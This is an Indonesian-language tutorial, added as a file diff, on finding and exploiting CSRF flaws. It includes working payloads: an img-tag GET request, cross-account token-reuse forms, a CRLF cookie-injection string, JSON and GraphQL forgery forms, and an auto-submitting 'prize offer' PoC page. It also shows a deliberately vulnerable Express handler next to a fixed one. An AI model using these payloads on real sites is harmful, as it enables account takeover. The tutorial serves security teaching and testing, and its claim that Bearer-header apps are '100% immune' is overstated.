@@ -1,0 +1,299 @@
+# Cross-Site Request Forgery (CSRF): Memahami Celah, Cara Kerja, & Pengujian Token
+
+Banyak pengembang dan pemula dalam keamanan web sering bingung memahami: **"Di mana sebenarnya letak bug dari CSRF?"**, **"Bagaimana cara mengujinya secara sistematis?"**, dan **"Apakah web modern dengan Bearer token masih bisa terkena CSRF?"**
+
+Secara sederhana, **CSRF (Cross-Site Request Forgery)** adalah kerentanan keamanan web di mana penyerang **memperdaya browser korban** agar mengirimkan request berbahaya tanpa disadari (seperti mengubah email, mengganti password, atau mentransfer uang) ke aplikasi web target tempat korban sedang dalam keadaan login (*authenticated*).
+
+---
+
+## 1. Di Mana Letak "Bug"-nya? (Akar Masalah CSRF)
+
+Celah CSRF muncul akibat perpaduan antara **perilaku alami peramban web (*browser behavior*)** dan **kecerobohan desain di sisi server (*server-side design flaw*)**:
+
+### 1. Perilaku Alami Browser (Ambient Credentials / Automatic Cookie Attachment)
+Ketika kamu login ke sebuah website (misalnya `bank.com`), server memberikan **Session Cookie** yang disimpan di perambanmu.
+
+Setiap kali browser mengirim request ke `bank.com`—**bahkan jika request tersebut dipicu oleh situs lain yang kamu buka di tab terpisah (misalnya `evil-hacker.com`)**—browser secara otomatis **akan tetap melampirkan cookie session `bank.com` milikmu**!
+
+### 2. Kecerobohan di Sisi Server (Hanya Percaya Cookie)
+Jika server `bank.com` **hanya mengandalkan Session Cookie** untuk memvalidasi permintaan:
+- Server melihat request masuk: *"Oh, ada cookie session milik Budi yang sah!"*
+- Server **TIDAK BISA MEMBEDAKAN** apakah request itu dikirim karena Budi mengklik tombol di `bank.com`, atau karena peramban Budi dipaksa mengirim request saat membuka situs jebakan `evil-hacker.com`!
+
+> [!IMPORTANT]
+> **LETAK BUG-NYA:** Server tidak memiliki mekanisme untuk memverifikasi **KEASLIAN NIAT (INTENT)** pengguna. Server hanya memvalidasi identitas (*Who are you?* via Cookie), bukan asal usul perintah (*Did you actually click this?*).
+
+---
+
+## 2. Alur Anatomi Serangan CSRF
+
+![CSRF Anatomy Diagram](/images/csrf-concept-diagram.svg)
+
+---
+
+## 3. Apa Itu CSRF Token & Mengapa Menjadi Solusi?
+
+Untuk mengatasi celah ini, industri keamanan menciptakan **Anti-CSRF Token** (*Synchronizer Token Pattern*):
+
+1. Ketika pengguna membuka form transfer/ubah profil di `target.com`, server membuat sebuah **kode rahasia acak yang unik, panjang, dan tidak bisa ditebak (*unpredictable token*)**.
+2. Token ini disisipkan ke dalam form HTML sebagai input tersembunyi (*hidden field*):
+   ```html
+   <input type="hidden" name="csrf" value="d9f83a2e1c0b47a9..." />
+   ```
+3. Ketika form dikirim, server memeriksa dua hal sekaligus:
+   - **Cookie Session:** Memverifikasi identitas pengguna (siapa yang login).
+   - **Parameter CSRF Token:** Memverifikasi bahwa request benar-benar berasal dari halaman form resmi milik server.
+
+### Mengapa Penyerang di `evil.com` Tidak Bisa Mencuri Token Korban?
+Karena adanya aturan **Same-Origin Policy (SOP)** di browser! Situs `evil.com` dilarang oleh browser membaca isi halaman atau kode HTML dari domain `target.com`. Penyerang bisa memaksa browser mengirim request, tetapi penyerang **tidak bisa membaca atau menebak** nilai CSRF token milik korban.
+
+---
+
+## 4. Katalog Celah & Kelemahan Validasi CSRF Token
+
+Pengembang sering kali melakukan kesalahan fatal saat mengimplementasikan pengecekan CSRF token di backend:
+
+![CSRF Token Flaws](/images/csrf-token-flaws.svg)
+
+---
+
+### Celah 1: Validasi Token Bergantung pada Request Method (POST vs GET)
+Pengembang mengonfigurasi filter keamanan untuk memvalidasi token hanya pada request dengan metode **POST**. Jika request dikirim menggunakan metode **GET**, middleware melewati validasi token!
+
+#### Cara Menguji & Eksploitasi:
+Ubah form HTML eksploitasi dari `POST` menjadi `GET`:
+```html
+<!-- Cukup dengan tag gambar (tanpa form submit!) -->
+<img src="https://target.com/email/change?email=hacker@evil.com" />
+```
+
+---
+
+### Celah 2: Validasi Token Bergantung pada Keberadaan Parameter (Token Presence)
+Beberapa middleware backend memeriksa token dengan logika yang salah:
+```javascript
+// ❌ KODE RENTAN: Hanya memvalidasi JIKA parameter csrf ada
+if (req.body.csrf) {
+  validateCsrfToken(req.body.csrf);
+}
+```
+
+#### Cara Menguji & Eksploitasi:
+Di Burp Suite, **hapus parameter `csrf` secara keseluruhan** dari body request POST. Jika server merespons `200 OK` dan email/password berhasil diubah, aplikasi rentan terhadap celah *Token Presence*!
+
+---
+
+### Celah 3: Token Tidak Terikat ke Sesi Pengguna (Untied Session Token Pool)
+Server memang memvalidasi apakah CSRF token yang dikirim itu sah dan ada di dalam database (*global token pool*), tetapi server **TIDAK MEMERIKSA apakah token tersebut milik pengguna yang sedang login saat ini**.
+
+#### Studi Kasus Pengujian 2 Akun (Wiener vs Carlos):
+1. **Wiener (Akun Penyerang):** Login ke web target, salin nilai token CSRF sah miliknya (`gTEZBeALZIzytDnGqldU17LemGrYRGax`).
+2. **Carlos (Akun Korban):** Login di browser berbeda.
+3. Penyerang membuat form HTML yang berisi **token milik Wiener**, lalu dijalankan di browser **Carlos**:
+   ```html
+   <form action="https://target.com/my-account/change-email" method="POST">
+     <input type="hidden" name="email" value="hacker@evil.com" />
+     <input type="hidden" name="csrf" value="gTEZBeALZIzytDnGqldU17LemGrYRGax" />
+   </form>
+   ```
+4. **Hasil:** Email Carlos berhasil berubah! Server tertipu karena token tersebut valid di sistem, tanpa memeriksa bahwa token tersebut bukan milik Carlos.
+
+---
+
+### Celah 4: Token Terikat ke Cookie Non-Session (`csrfKey` Injection)
+Beberapa aplikasi mengikat CSRF token bukan ke session ID login, melainkan ke cookie pelacak terpisah bernama `csrfKey`.
+Jika aplikasi memiliki celah sekunder seperti **Cookie Injection / CRLF Injection** (misalnya di fitur pencarian `/?search=test%0d%0aSet-Cookie:%20csrfKey=hackerKey`), penyerang dapat menyuntikkan `csrfKey` miliknya ke peramban korban bersamaan dengan CSRF token pasangannya.
+
+---
+
+## 5. Apakah CSRF Hanya Terjadi pada Form Input HTML?
+
+**Jawabannya: TIDAK!**
+
+Meskipun form HTML (`<form>`) adalah media yang paling umum, celah CSRF pada dasarnya bisa terjadi pada **semua permintaan yang mengubah data/status (*state-changing request*)**:
+
+### 1. CSRF Lewat URL / Tag Media (GET Request)
+```html
+<img src="https://bank.com/transfer?to=hacker&amount=1000000" />
+<a href="https://target.com/api/delete-account">Klik di sini untuk klaim hadiah!</a>
+```
+
+### 2. CSRF pada REST API & JSON Body (`enctype="text/plain"`)
+Jika backend menerima format JSON tanpa memvalidasi header `Content-Type` secara ketat, form HTML dapat membentuk JSON palsu:
+```html
+<form action="https://target.com/api/user/update" method="POST" enctype="text/plain">
+  <input name='{"email":"hacker@evil.com", "ignore":"' value='test"}' type='hidden'>
+</form>
+```
+
+### 3. CSRF pada GraphQL Mutations
+```html
+<form action="https://target.com/graphql" method="POST">
+  <input type="hidden" name="query" 
+         value="mutation { changeEmail(newEmail: &quot;hacker@evil.com&quot;) { success } }" />
+</form>
+```
+
+### 4. Cross-Site WebSocket Hijacking (CSWSH)
+Saat browser membuka koneksi WebSocket (`wss://`), cookie session otomatis dikirimkan saat handshake awal, memungkinkan situs penyerang membajak stream WebSocket korban secara realtime.
+
+### 5. Login & Logout CSRF
+* **Logout CSRF:** Menjebak korban agar ter-logout paksa.
+* **Login CSRF:** Memaksa browser korban login ke akun penyerang untuk merekam aktivitas korban (misal pencarian atau input data pribadi).
+
+---
+
+## 6. Web Modern: Apakah Bearer Token di Header Masih Rentan CSRF?
+
+Jika aplikasi web modern menggunakan header kustom:
+```http
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+Maka aplikasi tersebut **100% KEBAL / AMAN dari CSRF klasik**, karena:
+1. Browser **TIDAK PERNAH** menempelkan header `Authorization` secara otomatis saat mengirim request cross-origin.
+2. Penyerang tidak bisa membaca token korban di `localStorage` karena terhalang **Same-Origin Policy (SOP)**.
+3. Permintaan lintas domain yang menggunakan header kustom akan otomatis memicu **CORS Preflight (`OPTIONS`)** yang akan diblokir browser jika origin tidak diizinkan.
+
+### ⚠️ Tiga Jebakan pada Web Modern:
+1. **JWT Disimpan di Cookie:** Jika token dikirimkan lewat cookie (`Set-Cookie: token=...; HttpOnly`) alih-alih header, aplikasi **tetap rentan CSRF** kecuali diproteksi oleh `SameSite=Lax/Strict`.
+2. **Dilema XSS vs CSRF:**
+   * Simpan di `localStorage`: Kebal CSRF, tapi rentan dicuri lewat **XSS**.
+   * Simpan di `HttpOnly Cookie`: Kebal XSS, tapi wajib dilindungi dari **CSRF**.
+3. **CORS Misconfiguration:** Jika backend mengizinkan `Access-Control-Allow-Origin: https://evil.com` dengan credentials.
+
+---
+
+## 7. Checklist Sistematis Pengujian CSRF (Bug Hunter Protocol)
+
+Saat kamu menguji sebuah form atau aksi sensitif, ikuti diagram alur 5 langkah ini:
+
+```text
+Tangkap Request POST di Burp Repeater
+               │
+               ▼
+[ 1. Apakah ada token CSRF? ] ──────────► TIDAK ADA  ===> [ VULNERABLE: Pure CSRF ]
+               │ (Ada)
+               ▼
+[ 2. Hapus parameter CSRF ] ────────────► SUKSES 200 ===> [ VULNERABLE: Token Presence Flaw ]
+               │ (Ditolak)
+               ▼
+[ 3. Ubah method POST ke GET ] ─────────► SUKSES 200 ===> [ VULNERABLE: Method Toggling Flaw ]
+               │ (Ditolak)
+               ▼
+[ 4. Ganti isi token jadi acak ] ───────► SUKSES 200 ===> [ VULNERABLE: Token Validation Skipped ]
+               │ (Ditolak)
+               ▼
+[ 5. Tukar token dengan Akun Lain ] ────► SUKSES 200 ===> [ VULNERABLE: Untied Session Token ]
+```
+
+---
+
+## 8. Template Eksploitasi PoC Otomatis (0-Click Exploitation)
+
+Berikut template lengkap file HTML auto-submit untuk laporan bug bounty:
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Penawaran Hadiah Spesial</title>
+  </head>
+  <body>
+    <h1>Sedang memproses permintaan Anda...</h1>
+    
+    <!-- Form tersembunyi yang menargetkan endpoint sensitif korban -->
+    <form id="csrfForm" action="https://target-lab.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker@evil.com" />
+      <!-- Sisipkan token valid (jika mengeksploitasi celah Untied Session Token) -->
+      <input type="hidden" name="csrf" value="VALID_ATTACKER_TOKEN_HERE" />
+    </form>
+
+    <!-- Auto-submit instan saat halaman terbuka -->
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
+```
+
+---
+
+## 9. Bedah Kode Backend: Rentan vs Aman
+
+### ❌ Contoh Kode Backend yang Rentan (Hanya Memeriksa Cookie Session)
+```typescript
+import express from "express";
+const app = express();
+app.use(express.urlencoded({ extended: true }));
+
+app.post("/my-account/change-email", (req, res) => {
+  const sessionUser = req.cookies.session_user_id;
+
+  // ❌ FATAL: Server hanya memastikan ada cookie session
+  // Tidak ada verifikasi CSRF Token / Header Origin
+  if (!sessionUser) {
+    return res.status(401).send("Harap login terlebih dahulu.");
+  }
+
+  // Langsung mengubah email korban di database
+  updateUserEmail(sessionUser, req.body.email);
+  return res.send("Email berhasil diubah!");
+});
+```
+
+---
+
+### ✅ Contoh Kode Backend yang Aman (Menggunakan Validasi Token Terikat & SameSite Cookie)
+```typescript
+import express from "express";
+import crypto from "crypto";
+
+const app = express();
+app.use(express.urlencoded({ extended: true }));
+
+// 1. Generate CSRF token yang terikat kuat ke Session pengguna
+app.get("/my-account/profile", (req, res) => {
+  const sessionId = req.cookies.session_id;
+  const userSession = getSession(sessionId);
+
+  if (!userSession.csrfToken) {
+    userSession.csrfToken = crypto.randomBytes(32).toString("hex");
+  }
+
+  res.render("profile", { csrfToken: userSession.csrfToken });
+});
+
+// 2. Validasi Ketat pada Endpoint Aksi Perubahan Data
+app.post("/my-account/change-email", (req, res) => {
+  const sessionId = req.cookies.session_id;
+  const userSession = getSession(sessionId);
+
+  if (!userSession) {
+    return res.status(401).json({ error: "Sesi tidak sah." });
+  }
+
+  const clientToken = req.body.csrf;
+
+  // ✅ KUNCI PERTAHANAN: Token wajib ada DAN wajib cocok dengan sesi pemilik!
+  if (!clientToken || typeof clientToken !== "string" || clientToken !== userSession.csrfToken) {
+    return res.status(403).json({ error: "Permintaan ditolak: Invalid CSRF Token." });
+  }
+
+  updateUserEmail(userSession.userId, req.body.email);
+  return res.json({ success: true, message: "Email berhasil diperbarui." });
+});
+```
+
+---
+
+## 10. Strategi Mitigasi Modern
+
+1. **Gunakan Atribut Cookie `SameSite=Lax` atau `SameSite=Strict`:**
+   Melarang peramban melampirkan cookie session pada request yang dipicu dari domain pihak ketiga (*cross-site context*).
+2. **Implementasikan Anti-CSRF Token Kriptografis Terikat Sesi:**
+   Gunakan middleware bawaan framework yang teruji (seperti `csurf` di Node.js, Spring Security CSRF di Java, atau `{% csrf_token %}` di Django).
+3. **Gunakan Custom Request Header untuk REST API / Single Page App:**
+   Permintaan AJAX/Fetch yang menyertakan header kustom (seperti `X-Requested-With: XMLHttpRequest` atau `X-CSRF-Token`) tidak dapat dikirim secara otomatis oleh form HTML standar dari domain lain tanpa lolos preflight CORS.
+4. **Wajibkan Re-Autentikasi untuk Aksi Kritis:**
+   Selalu minta konfirmasi kata sandi lama sebelum mengizinkan perubahan email, kata sandi baru, atau transfer dana bernilai tinggi.
